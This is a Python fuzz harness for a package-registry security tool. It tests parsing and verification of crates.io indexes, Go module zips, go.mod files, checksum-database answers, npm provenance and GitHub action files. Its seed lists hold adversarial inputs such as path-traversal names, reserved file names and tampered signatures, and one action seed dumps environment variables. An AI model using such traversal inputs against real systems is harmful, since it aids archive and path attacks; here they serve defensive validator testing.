        check(set(declared.aliases) <= set(deps) and all(isinstance(v, str) and valid_name(eco, v) for v in declared.aliases.values()),
              "crates-manifest-aliases", repr(declared.aliases)[:120])
        check(eco.run_targets("crate", manifests, CARGO_MEMBERS) == got and eco.declared("crate", manifests, CARGO_MEMBERS) == declared,
              "crates-manifest-deterministic", "two readings of one manifest differ")

    return run, lambda: None


# ---- Go: the module zip, and its h1: hash
def go_zip_seeds():
    root = "example.com/m@v1.0.0/"
    module = [(root + "go.mod", b"module example.com/m\n\ngo 1.22\n", "file"), (root + "m.go", b"package m\n\nfunc F() {}\n", "file"),
              (root + "cmd/", b"", "dir"), (root + "cmd/tool/main.go", b"package main\n\nfunc main() {}\n", "file"),
              (root + "LICENSE", b"MIT\n", "file"), (root + "\u00e9/\u4e2d.go", b"package x\n", "file")]
    odd = [(root + "a.go", b"1", "file"), (root + "a.go", b"2", "file"), (root + "a\nb.go", b"x", "file"), (root + "d/", b"data", "file"),
           ("../x.go", b"x", "file"), (root + "sub/go.mod", b"module x\n", "file"), (root + "GO.MOD", b"module x\n", "file")]
    return [zip_bytes(module), zip_bytes(module, zipfile.ZIP_STORED), zip_bytes(odd), zip_bytes([]), zip_bytes(module, comment=b"note"),
            zip_bytes(module, zipfile.ZIP_BZIP2), zip_bytes(module[:1]), zip_bytes([(root + "e.go", b"", "file")])]


GO_ZIP_WORDS = (b"PK\x03\x04", b"PK\x01\x02", b"PK\x05\x06", b"PK\x06\x06", b"PK\x06\x07", b"PK\x07\x08", b"\x08\x00", b"\x00\x08",
                b"\x14\x00", b"\xff\xff\xff\xff", b"example.com/m@v1.0.0/", b"go.mod", b"\n", b"/", b"\xc3\xa9", b"\xff", b"\x00" * 8)


def go_zip_start():
    from lazaret.registry.ecosystems import base, golang
    eco = golang.Go()
    h1_re = re.compile(r"h1:[A-Za-z0-9+/]{43}=")
    wrong = "h1:" + "A" * 43 + "="

    def run(data):
        try:
            first = golang.zip_h1(data)
        except base.DigestError as exc:
            refusal(exc, "go-zip-message")
            return
        check(isinstance(first, str) and h1_re.fullmatch(first), "go-zip-format", repr(first)[:80])
        check(golang.zip_h1(data) == first, "go-zip-deterministic", "two hashes of one zip differ")
        with zipfile.ZipFile(io.BytesIO(data)) as zf:
            raw = [i.orig_filename.encode("utf-8" if i.flag_bits & 0x800 else "cp437") for i in zf.infolist()]
        check(len(raw) == len(set(raw)) and not any(b"\n" in n for n in raw), "go-zip-names", "a hash for a zip Go refuses")
        check(eco.verify(data, {"h1": first}, "example.com/m", "v1.0.0") == ("h1", first[3:]), "go-zip-verify", first)
        if first != wrong:
            try:
                eco.verify(data, {"h1": wrong}, "example.com/m", "v1.0.0")
            except base.DigestError as exc:
                refusal(exc, "go-zip-message")
            else:
                check(False, "go-zip-wrong-hash-accepted", first)

    return run, lambda: None


# ---- Go: go.mod
GOMOD_SEEDS = [
    b"module example.com/m\n\ngo 1.22\n\nrequire (\n\ta.example/x v1.0.0\n\tb.example/y v1.2.3 // indirect\n)\n\nrequire c.example/z v0.1.0\n",
    b'// header\r\nmodule "example.com/m" // c\r\ngo 1.22\r\ntoolchain go1.22.1\r\nrequire (\r\n\t`a.example/x` v1.0.0 //indirect\r\n)\r\n'
    b'replace a.example/x => ./x\r\nexclude e.example/v v1.0.0\r\nretract v0.9.0\r\n',
    b"module m\nrequire a.example/x v1.0.0\nrequire a.example/x v1.1.0\nrequire bad v1.0.0\nrequire a.example/y v1\n"
    b"require a.example/z v1.0.0+incompatible\nrequire a.example/w v0.0.0-20190101000000-abcdefabcdef\n",
    b"require (\n\trequire (\n\ta.example/x v1.0.0\n))\n(\n)\nmodule (\n\tx.example/m\n)\n", b"module\ngo\nrequire\nrequire (\n", b"",
    b"module " + b"a" * 300 + b"\nrequire " + b"b.example/" + b"c" * 300 + b" v1.0.0\n", b"\xef\xbb\xbfmodule example.com/m\n", b"module a.b/c /* x */ \n",
]
GOMOD_WORDS = (b"module ", b"go ", b"toolchain ", b"require ", b"require (", b"replace ", b"exclude ", b"retract ", b"godebug ", b"tool ",
               b"ignore ", b"=>", b"(", b")", b"// indirect", b"//indirect", b"// indirect; x", b"/*", b"*/", b"\"", b"`", b"\\", b"\r\n", b"\n",
               b"v1.0.0", b"v1.0.0+incompatible", b"v0.0.0-20190101000000-abcdefabcdef", b"v2", b"example.com/m", b"gopkg.in/yaml.v3", b"\t",
               b"\xef\xbb\xbf", b"\x00", b"\xff")


def go_mod_start():
    from lazaret.registry.ecosystems import base, golang
    eco = golang.Go()

    def run(data):
        text = data.decode("utf-8", "replace")
        got = golang.parse_gomod(text)
        check(isinstance(got, dict) and set(got) == {"module", "go", "require"}, "go-mod-shape", repr(got)[:120])
        check(got["module"] is None or isinstance(got["module"], str), "go-mod-module", repr(got["module"])[:80])      # (as written: Go's reader
        check(got["go"] is None or isinstance(got["go"], str), "go-mod-go", repr(got["go"])[:80])                    # takes `module ""` too)
        require = got["require"]
        check(isinstance(require, list) and len(require) <= golang.MAX_REQUIRES and len(require) <= len(text), "go-mod-count", f"{len(require)} from {len(text)}")
        for item in require:
            check(isinstance(item, tuple) and len(item) == 3 and isinstance(item[0], str) and isinstance(item[2], bool),
                  "go-mod-requirement-shape", repr(item)[:120])
            check(golang.canonical_version(item[1]) == item[1] != "", "go-mod-requirement-version", repr(item[1])[:80])
        check(golang.parse_gomod(text) == got, "go-mod-deterministic", "two readings of one go.mod differ")
        declared = eco.declared("gomod", {"go.mod": text}, [])
        check(isinstance(declared, base.Declared) and (declared.name is None or valid_name(eco, declared.name)), "go-mod-declared-name",
              repr(declared.name)[:80])
        deps = declared.dependencies
        check(isinstance(deps, tuple) and list(deps) == sorted(set(deps)) and all(valid_name(eco, d) for d in deps), "go-mod-declared-dependencies",
              repr(deps)[:120])
        check(set(deps) <= {path for path, _, _ in require}, "go-mod-declared-from-requirements", repr(deps)[:120])
        first = {}
        for path, version, _ in require:
            first.setdefault(path, version)
        check(declared.specs == {d: first[d] for d in deps} and not declared.aliases, "go-mod-declared-specs",
              f"{declared.specs!r} {declared.aliases!r}"[:120])

    return run, lambda: None


# ---- Go: the checksum database's answer
SUMDB_NAME, SUMDB_VERSION = "example.com/m", "v1.0.0"
SUMDB_HASH_A, SUMDB_HASH_B = "h1:" + "A" * 43 + "=", "h1:" + "B" * 43 + "="


def sumdb_text(module=SUMDB_NAME, version=SUMDB_VERSION, number="7", records=None, tree="go.sum database tree\n42\n" + "C" * 43 + "=\n",
               signature="\u2014 sum.golang.org Az3grlgtzPICa5OS8npVmf1Myq/5IZniMp+ZJurmRDeOoRDe4URYN7u5/Zhcyv2q1gGzGku9nTo+zyWE+xeMcTOAYQ8="):
    if records is None:
        records = [f"{module} {version} {SUMDB_HASH_A}", f"{module} {version}/go.mod {SUMDB_HASH_B}"]
    return f"{number}\n" + "\n".join(records) + f"\n\n{tree}\n{signature}\n"


SUMDB_SEEDS = [sumdb_text().encode("utf-8"), sumdb_text(records=[f"{SUMDB_NAME} {SUMDB_VERSION} {SUMDB_HASH_A}"]).encode("utf-8"),
               sumdb_text(records=[f"{SUMDB_NAME} {SUMDB_VERSION} {SUMDB_HASH_A}", f"{SUMDB_NAME} {SUMDB_VERSION} {SUMDB_HASH_B}"]).encode("utf-8"),
               sumdb_text(number="x").encode("utf-8"), sumdb_text(tree="").encode("utf-8"), sumdb_text(records=["a b"]).encode("utf-8"),
               sumdb_text(records=[f"other.example/x {SUMDB_VERSION} {SUMDB_HASH_A}"]).encode("utf-8"), b"", b"\n\n",
               sumdb_text(number="9" * 40).encode("utf-8"), sumdb_text(records=["", f"{SUMDB_NAME} {SUMDB_VERSION} {SUMDB_HASH_A}"]).encode("utf-8")]
SUMDB_WORDS = (b"h1:", b"go.sum database tree\n", b"\n\n", b"\xe2\x80\x94 ", b"/go.mod", SUMDB_NAME.encode(), SUMDB_VERSION.encode(), b" ", b"\n",
               b"\r", b"\x00", b"\t", b"=", b"A" * 43 + b"=", b"0", b"-1", b"+")


def go_sumdb_start():
    from lazaret.registry.ecosystems import base, golang
    h1_re = re.compile(r"h1:[A-Za-z0-9+/]{43}=")

    def run(data):
        text = data.decode("utf-8", "replace")
        try:
            got = golang.parse_lookup(text, SUMDB_NAME, SUMDB_VERSION)
        except base.FetchError as exc:
            refusal(exc, "go-sumdb-message")
            return
        check(isinstance(got, dict) and set(got) == {"id", "h1", "gomod_h1"}, "go-sumdb-shape", repr(got)[:120])
        check(isinstance(got["id"], int) and not isinstance(got["id"], bool) and got["id"] == int(text.split("\n", 1)[0]), "go-sumdb-id", repr(got["id"]))
        check(isinstance(got["h1"], str) and h1_re.fullmatch(got["h1"]), "go-sumdb-h1", repr(got["h1"])[:80])
        check(got["gomod_h1"] is None or (isinstance(got["gomod_h1"], str) and h1_re.fullmatch(got["gomod_h1"])), "go-sumdb-gomod-h1",
              repr(got["gomod_h1"])[:80])
        check(f"\n{SUMDB_NAME} {SUMDB_VERSION} {got['h1']}\n" in text, "go-sumdb-h1-from-the-record", repr(got["h1"]))
        if got["gomod_h1"] is not None:
            check(f"\n{SUMDB_NAME} {SUMDB_VERSION}/go.mod {got['gomod_h1']}\n" in text, "go-sumdb-gomod-from-the-record", repr(got["gomod_h1"]))
        check(golang.parse_lookup(text, SUMDB_NAME, SUMDB_VERSION) == got, "go-sumdb-deterministic", "two readings of one response differ")

    return run, lambda: None


# ---- Go: the checksum database's answer checked (NET-1): the real database's answer, changed
SUMDB_CAPTURE = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))), "rust", "crates",
                             "pratique", "tests", "data", "sumdb")
CHECK_NAME, CHECK_VERSION = "golang.org/x/mod", "v0.17.0"
CHECK_TILES = ("tile/8/0/x097/482", "tile/8/0/x260/730.p/101", "tile/8/1/380", "tile/8/1/x001/018.p/122", "tile/8/2/001",
               "tile/8/2/003.p/250", "tile/8/3/000.p/3")
CHECK_WORDS = (b"\n", b"\n\n", b"\xe2\x80\x94 ", b"sum.golang.org", b"go.sum database tree\n", b"h1:", b"/go.mod", b"24955599",
               b"66746981", b"66746896", b"=", b" ", CHECK_NAME.encode(), CHECK_VERSION.encode())


def sumdb_capture(rel):
    """A file of pratique's capture of the real sum.golang.org (its tests/data/sumdb/README.txt)."""
    with open(os.path.join(SUMDB_CAPTURE, *rel.split("/")), "rb") as fh:
        return fh.read()


def check_seeds():
    lookup = sumdb_capture("lookup.txt")
    return [lookup, lookup.replace(b"h1:zY54", b"h1:zY55"), lookup.replace(b"\n66746981\n", b"\n66746982\n"),
            lookup.replace(b"24955599\n", b"24955598\n", 1), lookup + "\u2014 other.example AAAAAAAA\n".encode("utf-8"),
            lookup.replace(b"/go.mod", b"/go.sum")]


def go_sumdb_check_start():
    from lazaret.registry.ecosystems import base, golang
    true = golang.parse_lookup(sumdb_capture("lookup.txt").decode("utf-8"), CHECK_NAME, CHECK_VERSION)
    tiles = {f"https://sum.golang.org/{path}": sumdb_capture(path) for path in CHECK_TILES}
    latest = sumdb_capture("latest.txt").decode("utf-8")

    def attempt(text, head):
        """-> (True, None, "refused" or "unread"; what parse_lookup read; the URLs asked), in a fresh process's memory
        or one that kept the head the database served a little before the lookup."""
        fetch, asked = served(golang.Go(), tiles.get)
        state = golang._Sumdb()
        if head:
            state.latest = (66746896, latest)
        saved, golang._SUMDB = golang._SUMDB, state
        try:
            try:
                record = golang.parse_lookup(text, CHECK_NAME, CHECK_VERSION)
            except base.FetchError:
                return "unread", None, asked
            try:
                return golang.verify_lookup(CHECK_NAME, CHECK_VERSION, text, record, fetch), record, asked
            except base.FetchError as exc:
                refusal(exc, "go-sumdb-check-message")
                return "refused", record, asked
        finally:
            golang._SUMDB = saved

    def run(data):
        text = data.decode("utf-8", "replace")
        head = zlib.crc32(data) % 2 == 0
        outcome, record, asked = attempt(text, head)
        check(len(asked) <= 2 * golang.MAX_SUMDB_TILES and all(url_text_ok(u) and u.startswith("https://sum.golang.org/tile/8/")
                                                               for u in asked), "go-sumdb-check-requests", repr(asked)[:200])
        if outcome not in ("unread", "refused"):
            check(outcome is True, "go-sumdb-check-checked", f"{outcome!r} (None: no native library that checks)")
            check(record == true, "go-sumdb-check-only-what-was-signed", repr(record)[:200])
        again = attempt(text, head)
        check(again[0] == outcome and again[1] == record, "go-sumdb-check-deterministic", "two checks of one answer differ")

    return run, lambda: None


# ---- npm's attestations checked (NET-1's provenance): the real registry's answer for the npm package sigstore, changed
SIGSTORE_CAPTURE = os.path.join(os.path.dirname(SUMDB_CAPTURE), "sigstore")
PROVENANCE_WORDS = (b'"attestations"', b'"predicateType"', b'"bundle"', b'"mediaType"', b'"dsseEnvelope"', b'"payload"',
                    b'"signatures"', b'"verificationMaterial"', b'"tlogEntries"', b'"logIndex"', b'"inclusionProof"',
                    b'"certificate"', b'"rawBytes"', b'"publicKey"', b'"hint"', b'null', b'true', b'[]', b'{}', b'"', b"=",
                    b"https://slsa.dev/provenance/v1", b"application/vnd.dev.sigstore.bundle.v0.3+json")


def provenance_capture(name):
    with open(os.path.join(SIGSTORE_CAPTURE, name), "rb") as fh:
        return fh.read()


def provenance_seeds():
    return [provenance_capture(f"sigstore-{v}.attestations.json") for v in ("4.0.0", "2.2.0")] + [b'{"attestations": []}']


def provenance_start():
    from lazaret.registry import provenance
    tarballs = {v: hashlib.sha512(provenance_capture(f"sigstore-{v}.tgz")).hexdigest() for v in ("4.0.0", "2.2.0")}
    # who really signed: the CI of sigstore/sigstore-js, and npm's two keys
    repository = "https://github.com/sigstore/sigstore-js"
    keys = {"SHA256:jl3bwswu80PjjokCgh0o2w5c2U4LhQAE57gj9cz1kzA", "SHA256:DhQ8wR5APBvFHLF/+Tc+AYvPOdTpcIDqOhxsBHRwC7U"}

    def attempt(text, digest):
        try:
            return provenance.verify("npm", text, digest)
        except provenance.Unchecked as exc:
            check(str(exc).isprintable() and len(str(exc)) <= 200, "provenance-message", repr(str(exc))[:160])
            return None

    def run(data):
        text = data.decode("utf-8", "replace")
        digest = tarballs["4.0.0" if zlib.crc32(data) % 2 == 0 else "2.2.0"]
        found = attempt(text, digest)
        if found is not None:
            check(isinstance(found, list), "provenance-shape", type(found).__name__)
            for a in found:
                check(a.get("outcome") in ("verified", "invalid", "unchecked") and isinstance(a.get("predicateType"), str),
                      "provenance-shape", repr(a)[:160])
                if a["outcome"] != "verified":
                    check(isinstance(a.get("reason"), str) and a["reason"].isprintable(), "provenance-shape", repr(a)[:160])
                    continue
                signer = a.get("signer") or {}
                check(signer.get("repository") == repository if signer.get("kind") == "certificate" else signer.get("id") in keys,
                      "provenance-only-who-signed", repr(signer)[:200])
        check(attempt(text, digest) == found, "provenance-deterministic", "two checks of one document differ")

    return run, lambda: None


# ---- Go: the proxy's `.info` answer (the checksum database answers for whatever version it is told of)
INFO_SEEDS = [b'{"Version":"v1.0.0","Time":"2016-01-10T10:55:54Z"}', b'{"Version":"v0.1.0-alpha.1","Time":"2020-01-01T00:00:00Z","Origin":'
              b'{"VCS":"git","URL":"https://example.invalid/m","Hash":"' + b"a" * 40 + b'"}}', b'{"Version":"v2.0.0+incompatible"}',
              b'{"Version":"v1.0.0-RC.1"}', b'{"Version":"v0.0.0-20190101000000-abcdefabcdef","Time":"2019-01-01T00:00:00Z"}', b'{"Version":5}',
              b'{"Version":"../../x"}', b"[]", b"null", b"", b'{"Time":"x"}', b'{"Version":"v1.0.0","Time":"' + b"9" * 400 + b'"}']
INFO_WORDS = (b'"Version"', b'"Time"', b'"Origin"', b'"v1.0.0"', b'"v2.0.0"', b'"v1.0.0-RC.1"', b'+incompatible', b'-', b'!', b"\\u0000", b"\\ud800",
              b"null", b"true", b"{", b"}", b"[", b"]", b"2016-01-10T10:55:54Z", b"/", b"..")


def go_resolve_start():
    from lazaret.registry.ecosystems import base, golang
    eco = golang.Go()
    names = ("example.com/m", "example.com/m/v2", "github.com/Azure/x", "gopkg.in/yaml.v3")

    def unescape(text):
        return re.sub(r"!([a-z])", lambda m: m.group(1).upper(), text)

    def serve(data):
        def answer(url):
            if "/lookup/" in url:
                module, _, version = unescape(url.rsplit("/lookup/", 1)[1]).partition("@")
                return sumdb_text(module, version).encode("utf-8")
            if url.endswith(".info") or url.endswith("/@latest"):
                return data
            return None
        return served(eco, answer)

    def unchecked(name, version, lookup, record, fetch):
        return None

    def run(data):
        # (the database here answers for whatever it is asked, unsigned, and serves no tiles: its signature and proof are
        # not what this target is about, so a lookup is read as one the check could not be made for (NET-1's
        # golang.verify_lookup; tests/registry/test_golang_sumdb.py checks it on the real database's answers))
        saved, golang.verify_lookup = golang.verify_lookup, unchecked
        try:
            resolved(data)
        finally:
            golang.verify_lookup = saved

    def resolved(data):
        name = names[zlib.crc32(data) % len(names)]
        wanted = (None, "v1.0.0", "v0.1.0-alpha.1", "v2.0.0+incompatible", "v3.0.0")[(zlib.crc32(data) >> 8) % 5]
        fetch, asked = serve(data)
        try:
            res = eco.resolve(name, wanted, fetch)
        except (base.SpecError, base.FetchError) as exc:
            refusal(exc, "go-resolve-message")
            return
        check(1 <= len(asked) <= 2 and all(url_text_ok(u) and u.startswith(("https://proxy.golang.org/", "https://sum.golang.org/")) for u in asked),
              "go-resolve-requests", repr(asked)[:200])
        check(isinstance(res, base.Resolution) and len(res.artifacts) == 1, "go-resolve-shape", type(res).__name__)
        art = res.artifacts[0]
        check(valid_version(eco, res[0]), "go-resolve-version", repr(res[0])[:80])
        if wanted is not None:
            check(res[0] == wanted, "go-resolve-asked-for", f"{wanted} -> {res[0]}")
        check(url_text_ok(art["url"]) and art["url"].startswith("https://proxy.golang.org/") and art["url"].endswith(".zip"), "go-resolve-url",
              repr(art["url"])[:160])
        check(art["container"] == "zip" and art["artifact"] == "gomod" and eco.container(art["filename"]) == "zip", "go-resolve-artifact",
              repr(art)[:160])
        entry = art["entry"]
        check(re.fullmatch(r"h1:[A-Za-z0-9+/]{43}=", entry["h1"] or "") is not None, "go-resolve-h1", repr(entry)[:120])
        check(res.info["module"] == name and res.info["root"] == f"{name}@{res[0]}/" and eco.archive_root(res, art) == res.info["root"],
              "go-resolve-root", repr(res.info)[:160])
        time_text = res.info["time"]
        check(time_text is None or (isinstance(time_text, str) and time_text.isprintable() and len(time_text) <= 40), "go-resolve-time", repr(time_text)[:60])
        again, _ = serve(data)
        second = eco.resolve(name, wanted, again)
        check(tuple(second) == tuple(res) and second.artifacts == res.artifacts and second.info == res.info, "go-resolve-deterministic",
              "two resolves of one answer differ")

    return run, lambda: None


# ---- the rules every module shares: names, versions, specs
NAMES_SEEDS = [b"serde\n1.0.0", b"github.com/pkg/errors\nv0.9.1", b"github.com/Azure/azure-sdk-for-go\nv1.2.3+incompatible", b"Foo_Bar\n1.0.0-rc.1",
               b"gopkg.in/yaml.v3\nv3.0.1", b"a\n0.0.0", b"x/y\n1", b"example.com/../x\nv1", b"\n", b"", b"a@b\nc@d", b"example.com/CON\nv1.0.0",
               b"-a\n1.0.0", b"e\xcc\x81\nv1.0.0", b"\xff\xfe\nv\xff", b"a" * 70 + b"\n1.0.0"]
NAMES_WORDS = (b"/", b"..", b".", b"@", b"-", b"_", b"~", b"!", b"%2f", b"%00", b"\\", b"\n", b" ", b"\t", b"\x00", b"v1.0.0", b"v2", b"+incompatible",
               b"1.0.0", b"-rc.1", b"+build", b"example.com/", b"github.com/", b"gopkg.in/", b".v3", b"CON", b"nul", b"\xe2\x80\xae", b"\xc3\xa9", b"\xff")
UNSAFE_SEGMENT = set('?#\\ ')


def names_start():
    from lazaret.registry.ecosystems import base, crates, golang
    ecosystems = (crates.Crates(), golang.Go())

    def run(data):
        text = data.decode("utf-8", "surrogateescape")
        name, _, version = text.partition("\n")
        for eco in ecosystems:
            try:
                good = eco.check_name(name)
            except base.SpecError as exc:
                refusal(exc, "names-message")
                for which in ("identity", "parse_spec"):
                    try:
                        getattr(eco, which)(name)
                    except base.SpecError:
                        continue
                    if which == "parse_spec" and ("@" in name or name != name.strip()):       # (a spec may say a version, and has no edge space)
                        continue
                    check(False, "names-refusal-consistent", f"{eco.id}: check_name refused it and {which} did not")
                good = None
            if good is not None:
                check(isinstance(good, str) and valid_name(eco, good), "names-idempotent", repr(good)[:80])
                ident = eco.identity(good)
                check(isinstance(ident, str) and eco.identity(ident) == ident, "names-identity-idempotent", repr(ident)[:80])
                seg = eco.segment(good)
                check(isinstance(seg, str) and seg != "" and not any(not 0x21 <= ord(c) <= 0x7e or c in UNSAFE_SEGMENT for c in seg)
                      and ".." not in seg.split("/") and not seg.startswith("/"), "names-segment", repr(seg)[:80])
            try:
                checked = eco.check_version(version)
            except base.SpecError as exc:
                refusal(exc, "names-message")
                checked = None
            if checked is not None:
                check(isinstance(checked, str) and valid_version(eco, checked), "names-version-idempotent", repr(checked)[:80])
                seg = eco.segment(checked)
                check(not any(not 0x21 <= ord(c) <= 0x7e or c in UNSAFE_SEGMENT for c in seg) and ".." not in seg.split("/"), "names-version-segment",
                      repr(seg)[:80])
                if good is not None:
                    check(eco.parse_spec(good + "@" + checked) == (good, checked), "names-spec", repr((good, checked))[:120])

    return run, lambda: None


# ---- the rules every module shares: the path of a member of an archive
MEMBER_SEEDS = [b"fnv-1.0.7/src/lib.rs\nfnv-1.0.7/", b"example.com/m@v1.0.0/go.mod\nexample.com/m@v1.0.0/", b"fnv-1.0.7/.cargo-ok\nfnv-1.0.7/",
                b"example.com/m@v1.0.0/sub/go.mod\nexample.com/m@v1.0.0/", b"example.com/m@v1.0.0/a/../b\nexample.com/m@v1.0.0/",
                b"example.com/m@v1.0.0/a\\b\nexample.com/m@v1.0.0/", b"x/y/z", b"/abs\n", b"c:/x\n", b"..\n", b"a//b\na/", b"\n", b"",
                b"example.com/m@v1.0.0/CON\nexample.com/m@v1.0.0/", b"example.com/m@v1.0.0/d/\nexample.com/m@v1.0.0/", b"x@1/y.go"]
MEMBER_WORDS = (b"/", b"//", b"..", b"/../", b"./", b"\\", b".cargo-ok", b"go.mod", b"GO.MOD", b"@", b"v1.0.0/", b"\n", b"c:", b"C:/", b"\x00",
                b"\xc3\xa9", b"\xff", b"CON", b"aux.txt", b"~1", b" ", b"fnv-1.0.7/", b"example.com/m@v1.0.0/")


def member_path_start():
    from lazaret.registry.ecosystems import base, crates, golang
    ecosystems = (crates.Crates(), golang.Go())

    def run(data):
        text = data.decode("utf-8", "surrogateescape")
        name, _, root = text.partition("\n")
        for eco in ecosystems:
            for kind in eco.artifact_kinds:
                for given in (None, root) if root else (None,):
                    rel, problem = eco.member_path(kind, name, given)
                    check(rel is None or isinstance(rel, str), "member-rel-type", repr(rel)[:80])
                    check(problem is None or isinstance(problem, str), "member-problem-type", repr(problem)[:80])
                    check(rel is None or problem is None, "member-rel-and-problem", repr((rel, problem))[:120])
                    if problem is not None:
                        refusal(ValueError(problem), "member-problem-message")
                    if rel is not None:
                        check(rel != "" and rel != "." and not rel.startswith("/") and ".." not in rel.split("/") and "\\" not in rel and "//" not in rel,
                              "member-rel-path", repr(rel)[:120])
                        if eco.id == "crates":
                            check(rel.rsplit("/", 1)[-1] != ".cargo-ok", "member-crates-marker", repr(rel)[:120])
                        if eco.id == "go":
                            check(rel.rsplit("/", 1)[-1].lower() != "go.mod" or rel == "go.mod", "member-go-mod-only-at-the-root", repr(rel)[:120])
                        if given:
                            check(name.startswith(given) or name.replace("\\", "/").startswith(given), "member-under-the-root",
                                  repr((name, given))[:120])
                    check(eco.member_path(kind, name, given) == (rel, problem), "member-deterministic", repr(name)[:80])

    return run, lambda: None


register("crates-index", "crates.io: Crates.resolve over the index file of one crate (the registry's answer, whatever it says)",
         lambda: list(CRATES_INDEX_SEEDS), crates_index_start, CRATES_WORDS, max_len=16384)
register("crates-manifest", "crates.io: run_targets and declared over a crate's Cargo.toml", lambda: list(CARGO_SEEDS), crates_manifest_start,
         CARGO_WORDS, max_len=8192)
register("go-zip", "Go: the h1: hash of a module zip (zip_h1) and verify against it", go_zip_seeds, go_zip_start, GO_ZIP_WORDS, max_len=16384)
register("go-mod", "Go: parse_gomod and declared over a go.mod", lambda: list(GOMOD_SEEDS), go_mod_start, GOMOD_WORDS, max_len=8192)
register("go-sumdb", "Go: parse_lookup over the checksum database's response", lambda: list(SUMDB_SEEDS), go_sumdb_start, SUMDB_WORDS, max_len=4096)
register("go-sumdb-check", "Go: verify_lookup over the real checksum database's answer, changed (its tiles served as captured)",
         check_seeds, go_sumdb_check_start, CHECK_WORDS, max_len=4096)
register("provenance-npm", "npm: provenance.verify over the real attestations of sigstore 4.0.0 and 2.2.0, changed",
         provenance_seeds, provenance_start, PROVENANCE_WORDS, max_len=65536)
register("go-resolve", "Go: Go.resolve over the proxy's .info answer (the checksum database answers for what it is told of)",
         lambda: list(INFO_SEEDS), go_resolve_start, INFO_WORDS, max_len=4096)
register("ecosystem-names", "crates.io and Go: check_name, identity, check_version, parse_spec and segment over a name and a version",
         lambda: list(NAMES_SEEDS), names_start, NAMES_WORDS, max_len=1024)
register("ecosystem-member-path", "crates.io and Go: member_path over a member name and an archive root", lambda: list(MEMBER_SEEDS),
         member_path_start, MEMBER_WORDS, max_len=1024)


# ---------------------------------------------------------------------------------------------- an action's code (N-4)
# The input is an action.yml (or, for one input in three, the Dockerfile of a Docker action), in a repository of a few
# files, as GitHub's archive of a commit holds it; repo.scan_action reads it as the runner runs the action.
ACTION_SHA = "0123456789abcdef0123456789abcdef01234567"
ACTION_FILES = {"dist/index.js": b"module.exports = require('./lib');\n", "dist/lib.js": b"module.exports = 1;\n",
                "dist/post.js": b"require('./index');\n", "install.sh": b"#!/bin/sh\nset -e\nnode \"$(dirname \"$0\")/dist/index.js\"\n",
                "entrypoint.sh": b"#!/bin/sh\nexec node /app/dist/index.js \"$@\"\n", "main.py": b"import os\nprint(os.getcwd())\n",
                "package.json": b'{"name": "x", "scripts": {"postinstall": "node install.js"}}\n'}
ACTION_DOCKER_YML = b"name: x\nruns:\n  using: docker\n  image: Dockerfile\n"
ACTION_SEEDS = [b"name: x\nruns:\n  using: 'node20'\n  pre: dist/post.js\n  main: dist/index\n  post: \"dist/post.js\"\n",
                b"runs:\n  using: composite\n  steps:\n    - run: ${{ github.action_path }}/install.sh\n      shell: bash\n"
                b"    - uses: actions/checkout@v4\n    - shell: python\n      run: |\n        import os\n        print(os.environ)\n"
                b"    - shell: pwsh\n      working-directory: ${{ github.action_path }}\n      run: ./x.ps1\n"
                b"    - run: |\n        cd \"$GITHUB_ACTION_PATH\"\n        python3 main.py \\\n          --x\n",
                b"runs:\n  using: docker\n  image: Dockerfile\n  entrypoint: /app/entrypoint.sh\n  args:\n    - ${{ inputs.x }}\n",
                b"runs:\n  using: docker\n  image: 'docker://alpine:3.20'\n",
                b"FROM golang:1.22 AS b\nARG V=1\nWORKDIR /src\nCOPY . .\nFROM alpine:3.${V}\nCOPY --from=b /src/x /x\n"
                b"COPY [\"entrypoint.sh\", \"dist\", \"/app/\"]\nENTRYPOINT [\"/app/entrypoint.sh\"]\nCMD node /app/dist/index.js\n"]
ACTION_WORDS = (b"runs:\n", b"  using: ", b"node20", b"composite", b"docker", b"  main: ", b"  pre: ", b"  post: ", b"  steps:\n",
                b"    - run: ", b"      shell: ", b"bash", b"pwsh", b"python", b"perl {0}", b"cmd", b"${{ github.action_path }}",
                b"$GITHUB_ACTION_PATH", b"      working-directory: ", b"  image: ", b"Dockerfile", b"  entrypoint: ",
                b"FROM ", b"COPY ", b"ADD ", b"ENTRYPOINT ", b"CMD ", b"WORKDIR ", b"ARG ", b" AS ", b"--from=", b"@sha256:",
                b"\\\n", b" |\n", b"cd ", b"../", b"/app/", b"dist/index.js", b"install.sh", b"entrypoint.sh", b"\"", b"'",
                b"- ", b"\t", b"\r\n", b"#")
ACTION_SEVERITIES = ("INFO", "MINOR", "MAJOR", "CRITICAL", "BLOCKER")


def action_start():
    from lazaret.registry import repo

    def archive(files):
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w:gz", format=tarfile.PAX_FORMAT, pax_headers={"comment": ACTION_SHA}) as tf:
            for name, payload in sorted(files.items()):
                info = tarfile.TarInfo("o-r-0123456/" + name)
                info.size = len(payload)
                tf.addfile(info, io.BytesIO(payload))
        return buf.getvalue()

    def run(data):
        files = dict(ACTION_FILES)
        if pick(data, (False, False, True)):
            files["action.yml"], files["Dockerfile"] = ACTION_DOCKER_YML, data
        else:
            files["action.yml"] = data
        packed = archive(files)
        res = repo.scan_action(packed, "", budget=repo.Budget(deadline=None))
        check(res["verdict"] in ("OK", "WARN", "SUSPICIOUS", "INCOMPLETE"), "action-code-shape", res["verdict"])
        info = res["action"]
        check(info is None or isinstance(info, dict), "action-code-shape", type(info).__name__)
        if info:
            check(all(isinstance(how, str) and rel in files for how, rel in info["runs"].items()),
                  "action-code-runs-the-archives-files", repr(info["runs"])[:200])
            check(all(isinstance(how, str) and isinstance(path, str) for how, path in info["missing"]),
                  "action-code-shape", repr(info["missing"])[:200])
            for where, line, image, pinned in info["bases"]:
                check(where in files and isinstance(line, int) and line >= 1 and isinstance(image, str)
                      and pinned == bool(re.search(r"@sha256:[0-9a-f]{64}$", image)), "action-code-bases", repr((where, line, image, pinned)))
        for i in res["issues"]:
            check(isinstance(i.get("rule"), str) and i.get("sev") in ACTION_SEVERITIES and isinstance(i.get("msg"), str)
                  and isinstance(i.get("file"), str) and isinstance(i.get("line"), int), "action-code-issues", repr(i)[:200])
        again = repo.scan_action(packed, "", budget=repo.Budget(deadline=None))
        check([(i["rule"], i["sev"], i["file"], i["line"], i["msg"]) for i in again["issues"]]
              == [(i["rule"], i["sev"], i["file"], i["line"], i["msg"]) for i in res["issues"]], "action-code-deterministic",
              "two scans of one archive differ")

    return run, lambda: None


